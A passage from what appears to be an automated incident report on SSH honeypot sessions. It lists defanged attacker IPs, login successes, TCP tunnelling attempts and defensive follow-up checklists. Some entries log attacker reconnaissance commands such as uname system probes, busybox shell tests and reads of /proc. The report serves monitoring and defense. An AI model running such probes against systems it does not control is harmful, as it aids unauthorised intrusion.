- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-deeb98b87463

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-08-17 05:44 |
| **Last Seen** | 2026-08-17 05:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:44:10` | `cowrie.session.connect` |
| `2026-08-17 05:44:11` | `cowrie.client.version` |
| `2026-08-17 05:44:11` | `cowrie.client.kex` |
| `2026-08-17 05:44:12` | `cowrie.login.success` |
| `2026-08-17 05:44:13` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:44:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3595e417395b

| Field | Detail |
|---|---|
| **Source IP** | `182.78.240[.]94` |
| **First Seen** | 2026-08-17 05:45 |
| **Last Seen** | 2026-08-17 05:45 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:45:28` | `cowrie.session.connect` |
| `2026-08-17 05:45:29` | `cowrie.client.version` |
| `2026-08-17 05:45:29` | `cowrie.client.kex` |
| `2026-08-17 05:45:34` | `cowrie.login.success` |
| `2026-08-17 05:45:35` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.78.240[.]94` to AbuseIPDB if not already reported
- [ ] Block `182.78.240[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8af1baeebbf4

| Field | Detail |
|---|---|
| **Source IP** | `178.178.222[.]53` |
| **First Seen** | 2026-08-17 05:45 |
| **Last Seen** | 2026-08-17 05:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:45:42` | `cowrie.session.connect` |
| `2026-08-17 05:45:42` | `cowrie.client.version` |
| `2026-08-17 05:45:42` | `cowrie.client.kex` |
| `2026-08-17 05:45:44` | `cowrie.login.success` |
| `2026-08-17 05:45:44` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:45:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.222[.]53` to AbuseIPDB if not already reported
- [ ] Block `178.178.222[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aa6c905d967

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]137` |
| **First Seen** | 2026-08-17 05:49 |
| **Last Seen** | 2026-08-17 05:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:49:03` | `cowrie.session.connect` |
| `2026-08-17 05:49:03` | `cowrie.client.version` |
| `2026-08-17 05:49:03` | `cowrie.client.kex` |
| `2026-08-17 05:49:04` | `cowrie.login.success` |
| `2026-08-17 05:49:05` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:49:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07885de2e5e1

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-17 05:49 |
| **Last Seen** | 2026-08-17 05:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:49:04` | `cowrie.session.connect` |
| `2026-08-17 05:49:04` | `cowrie.client.version` |
| `2026-08-17 05:49:04` | `cowrie.client.kex` |
| `2026-08-17 05:49:04` | `cowrie.login.success` |
| `2026-08-17 05:49:05` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:49:05` | `cowrie.direct-tcpip.data` |
| `2026-08-17 05:49:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-154a2e6ff9f7

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]137` |
| **First Seen** | 2026-08-17 05:49 |
| **Last Seen** | 2026-08-17 05:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:49:10` | `cowrie.session.connect` |
| `2026-08-17 05:49:10` | `cowrie.client.version` |
| `2026-08-17 05:49:10` | `cowrie.client.kex` |
| `2026-08-17 05:49:12` | `cowrie.login.success` |
| `2026-08-17 05:49:12` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:49:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]137` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d5a2dad7fe

| Field | Detail |
|---|---|
| **Source IP** | `65.20.134[.]97` |
| **First Seen** | 2026-08-17 05:50 |
| **Last Seen** | 2026-08-17 05:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:50:31` | `cowrie.session.connect` |
| `2026-08-17 05:50:32` | `cowrie.client.version` |
| `2026-08-17 05:50:32` | `cowrie.client.kex` |
| `2026-08-17 05:50:33` | `cowrie.login.success` |
| `2026-08-17 05:50:34` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:50:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.134[.]97` to AbuseIPDB if not already reported
- [ ] Block `65.20.134[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfa08312a19e

| Field | Detail |
|---|---|
| **Source IP** | `103.121.27[.]218` |
| **First Seen** | 2026-08-17 05:50 |
| **Last Seen** | 2026-08-17 05:50 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:50:45` | `cowrie.session.connect` |
| `2026-08-17 05:50:45` | `cowrie.client.version` |
| `2026-08-17 05:50:45` | `cowrie.client.kex` |
| `2026-08-17 05:50:47` | `cowrie.login.success` |
| `2026-08-17 05:50:47` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:50:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.121.27[.]218` to AbuseIPDB if not already reported
- [ ] Block `103.121.27[.]218` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f0e576e0f6d

| Field | Detail |
|---|---|
| **Source IP** | `186.215.107[.]189` |
| **First Seen** | 2026-08-17 05:50 |
| **Last Seen** | 2026-08-17 05:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:50:54` | `cowrie.session.connect` |
| `2026-08-17 05:50:55` | `cowrie.client.version` |
| `2026-08-17 05:50:55` | `cowrie.client.kex` |
| `2026-08-17 05:50:58` | `cowrie.login.success` |
| `2026-08-17 05:50:59` | `cowrie.direct-tcpip.request` |
| `2026-08-17 05:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.215.107[.]189` to AbuseIPDB if not already reported
- [ ] Block `186.215.107[.]189` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44b3d05f1690

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 05:57 |
| **Last Seen** | 2026-08-17 05:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 05:57:40` | `cowrie.session.connect` |
| `2026-08-17 05:57:40` | `cowrie.client.version` |
| `2026-08-17 05:57:40` | `cowrie.client.kex` |
| `2026-08-17 05:57:41` | `cowrie.login.success` |
| `2026-08-17 05:57:42` | `cowrie.session.params` |
| `2026-08-17 05:57:42` | `cowrie.command.input` |
| `2026-08-17 05:57:42` | `cowrie.log.closed` |
| `2026-08-17 05:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4843a28a650d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-17 06:03 |
| **Last Seen** | 2026-08-17 06:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:03:11` | `cowrie.session.connect` |
| `2026-08-17 06:03:11` | `cowrie.client.version` |
| `2026-08-17 06:03:12` | `cowrie.client.kex` |
| `2026-08-17 06:03:12` | `cowrie.login.success` |
| `2026-08-17 06:03:12` | `cowrie.direct-tcpip.request` |
| `2026-08-17 06:03:12` | `cowrie.direct-tcpip.data` |
| `2026-08-17 06:03:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cebe1208d442

| Field | Detail |
|---|---|
| **Source IP** | `104.199.87[.]85` |
| **First Seen** | 2026-08-17 06:16 |
| **Last Seen** | 2026-08-17 06:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:16:37` | `cowrie.session.connect` |
| `2026-08-17 06:16:37` | `cowrie.login.success` |
| `2026-08-17 06:16:38` | `cowrie.session.params` |
| `2026-08-17 06:16:38` | `cowrie.command.input` |
| `2026-08-17 06:16:38` | `cowrie.command.input` |
| `2026-08-17 06:16:38` | `cowrie.command.failed` |
| `2026-08-17 06:16:38` | `cowrie.command.input` |
| `2026-08-17 06:16:38` | `cowrie.log.closed` |
| `2026-08-17 06:16:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.199.87[.]85` to AbuseIPDB if not already reported
- [ ] Block `104.199.87[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c95c5e656a5

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 06:16 |
| **Last Seen** | 2026-08-17 06:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:16:46` | `cowrie.session.connect` |
| `2026-08-17 06:16:46` | `cowrie.client.version` |
| `2026-08-17 06:16:46` | `cowrie.client.kex` |
| `2026-08-17 06:16:47` | `cowrie.login.success` |
| `2026-08-17 06:16:48` | `cowrie.session.params` |
| `2026-08-17 06:16:48` | `cowrie.command.input` |
| `2026-08-17 06:16:48` | `cowrie.log.closed` |
| `2026-08-17 06:16:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ca61ac6bd98

| Field | Detail |
|---|---|
| **Source IP** | `104.199.87[.]85` |
| **First Seen** | 2026-08-17 06:16 |
| **Last Seen** | 2026-08-17 06:17 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:16:51` | `cowrie.session.connect` |
| `2026-08-17 06:16:51` | `cowrie.login.success` |
| `2026-08-17 06:16:52` | `cowrie.session.params` |
| `2026-08-17 06:16:52` | `cowrie.command.input` |
| `2026-08-17 06:16:52` | `cowrie.command.failed` |
| `2026-08-17 06:17:02` | `cowrie.log.closed` |
| `2026-08-17 06:17:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.199.87[.]85` to AbuseIPDB if not already reported
- [ ] Block `104.199.87[.]85` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e647d1f059a3

| Field | Detail |
|---|---|
| **Source IP** | `104.199.87[.]85` |
| **First Seen** | 2026-08-17 06:16 |
| **Last Seen** | 2026-08-17 06:17 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:16:53` | `cowrie.session.connect` |
| `2026-08-17 06:16:53` | `cowrie.login.success` |
| `2026-08-17 06:16:53` | `cowrie.session.params` |
| `2026-08-17 06:16:53` | `cowrie.command.input` |
| `2026-08-17 06:17:02` | `cowrie.log.closed` |
| `2026-08-17 06:17:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `104.199.87[.]85` to AbuseIPDB if not already reported
- [ ] Block `104.199.87[.]85` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01792894e1ee

| Field | Detail |
|---|---|
| **Source IP** | `81.214.75[.]248` |
| **First Seen** | 2026-08-17 06:17 |
| **Last Seen** | 2026-08-17 06:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:17:41` | `cowrie.session.connect` |
| `2026-08-17 06:17:42` | `cowrie.client.version` |
| `2026-08-17 06:17:42` | `cowrie.client.kex` |
| `2026-08-17 06:17:43` | `cowrie.login.success` |
| `2026-08-17 06:17:43` | `cowrie.direct-tcpip.request` |
| `2026-08-17 06:17:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.214.75[.]248` to AbuseIPDB if not already reported
- [ ] Block `81.214.75[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a52b30b9f48c

| Field | Detail |
|---|---|
| **Source IP** | `65.20.198[.]159` |
| **First Seen** | 2026-08-17 06:17 |
| **Last Seen** | 2026-08-17 06:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:17:53` | `cowrie.session.connect` |
| `2026-08-17 06:17:53` | `cowrie.client.version` |
| `2026-08-17 06:17:53` | `cowrie.client.kex` |
| `2026-08-17 06:17:55` | `cowrie.login.success` |
| `2026-08-17 06:17:55` | `cowrie.direct-tcpip.request` |
| `2026-08-17 06:18:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.198[.]159` to AbuseIPDB if not already reported
- [ ] Block `65.20.198[.]159` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bbcdfc03187

| Field | Detail |
|---|---|
| **Source IP** | `197.155.225[.]93` |
| **First Seen** | 2026-08-17 06:19 |
| **Last Seen** | 2026-08-17 06:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:19:12` | `cowrie.session.connect` |
| `2026-08-17 06:19:13` | `cowrie.client.version` |
| `2026-08-17 06:19:13` | `cowrie.client.kex` |
| `2026-08-17 06:19:15` | `cowrie.login.success` |
| `2026-08-17 06:19:15` | `cowrie.direct-tcpip.request` |
| `2026-08-17 06:19:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.155.225[.]93` to AbuseIPDB if not already reported
- [ ] Block `197.155.225[.]93` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4e1be32a381

| Field | Detail |
|---|---|
| **Source IP** | `196.189.126[.]10` |
| **First Seen** | 2026-08-17 06:19 |
| **Last Seen** | 2026-08-17 06:19 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:19:20` | `cowrie.session.connect` |
| `2026-08-17 06:19:21` | `cowrie.client.version` |
| `2026-08-17 06:19:21` | `cowrie.client.kex` |
| `2026-08-17 06:19:22` | `cowrie.login.success` |
| `2026-08-17 06:19:23` | `cowrie.direct-tcpip.request` |
| `2026-08-17 06:19:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.189.126[.]10` to AbuseIPDB if not already reported
- [ ] Block `196.189.126[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00943597bcbe

| Field | Detail |
|---|---|
| **Source IP** | `124.239.169[.]52` |
| **First Seen** | 2026-08-17 06:22 |
| **Last Seen** | 2026-08-17 06:23 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:22:54` | `cowrie.session.connect` |
| `2026-08-17 06:22:55` | `cowrie.client.version` |
| `2026-08-17 06:22:55` | `cowrie.client.kex` |
| `2026-08-17 06:22:59` | `cowrie.login.success` |
| `2026-08-17 06:23:00` | `cowrie.direct-tcpip.request` |
| `2026-08-17 06:23:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.169[.]52` to AbuseIPDB if not already reported
- [ ] Block `124.239.169[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3b68a35dbc1

| Field | Detail |
|---|---|
| **Source IP** | `120.224.15[.]67` |
| **First Seen** | 2026-08-17 06:24 |
| **Last Seen** | 2026-08-17 06:24 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:24:18` | `cowrie.session.connect` |
| `2026-08-17 06:24:19` | `cowrie.client.version` |
| `2026-08-17 06:24:19` | `cowrie.client.kex` |
| `2026-08-17 06:24:22` | `cowrie.login.success` |
| `2026-08-17 06:24:25` | `cowrie.direct-tcpip.request` |
| `2026-08-17 06:24:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.224.15[.]67` to AbuseIPDB if not already reported
- [ ] Block `120.224.15[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fb339f016bd

| Field | Detail |
|---|---|
| **Source IP** | `123.52.202[.]92` |
| **First Seen** | 2026-08-17 06:24 |
| **Last Seen** | 2026-08-17 06:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:24:30` | `cowrie.session.connect` |
| `2026-08-17 06:24:31` | `cowrie.client.version` |
| `2026-08-17 06:24:31` | `cowrie.client.kex` |
| `2026-08-17 06:24:34` | `cowrie.login.success` |
| `2026-08-17 06:24:34` | `cowrie.direct-tcpip.request` |
| `2026-08-17 06:24:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `123.52.202[.]92` to AbuseIPDB if not already reported
- [ ] Block `123.52.202[.]92` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d01b80a4bde

| Field | Detail |
|---|---|
| **Source IP** | `180.248.52[.]207` |
| **First Seen** | 2026-08-17 06:24 |
| **Last Seen** | 2026-08-17 06:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:24:32` | `cowrie.session.connect` |
| `2026-08-17 06:24:33` | `cowrie.client.version` |
| `2026-08-17 06:24:33` | `cowrie.client.kex` |
| `2026-08-17 06:24:36` | `cowrie.login.success` |
| `2026-08-17 06:24:37` | `cowrie.direct-tcpip.request` |
| `2026-08-17 06:24:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.248.52[.]207` to AbuseIPDB if not already reported
- [ ] Block `180.248.52[.]207` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27fb94c9b7cf

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-17 06:35 |
| **Last Seen** | 2026-08-17 06:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:35:52` | `cowrie.session.connect` |
| `2026-08-17 06:35:52` | `cowrie.client.version` |
| `2026-08-17 06:35:53` | `cowrie.client.kex` |
| `2026-08-17 06:35:53` | `cowrie.login.success` |
| `2026-08-17 06:35:54` | `cowrie.session.params` |
| `2026-08-17 06:35:54` | `cowrie.command.input` |
| `2026-08-17 06:35:54` | `cowrie.log.closed` |
| `2026-08-17 06:35:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6919c51813f0

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]210` |
| **First Seen** | 2026-08-17 06:44 |
| **Last Seen** | 2026-08-17 06:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-17 06:44:50` | `cowrie.session.connect` |
| `2026-08-17 06:44:50` | `cowrie.login.success` |
| `2026-08-17 06:44:51` | `cowrie.session.params` |
| `2026-08-17 06:44:52` | `cowrie.command.input` |
| `2026-08-17 06:44:52` | `cowrie.command.input` |
| `2026-08-17 06:44:53` | `cowrie.command.input` |
| `2026-08-17 06:44:53` | `cowrie.command.input` |
| `2026-08-17 06:44:53` | `cowrie.command.failed` |
| `2026-08-17 06:44:54` | `cowrie.log.closed` |
| `2026-08-17 06:44:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]210` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e702b2cc715a

| Field | Detail |
|---|---|
| **Source IP** | `36.89.252[.]58` |
| **First Seen** | 2026-08-17 06:51 |
| **Last Seen** | 2026-08-17 06:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 2 |
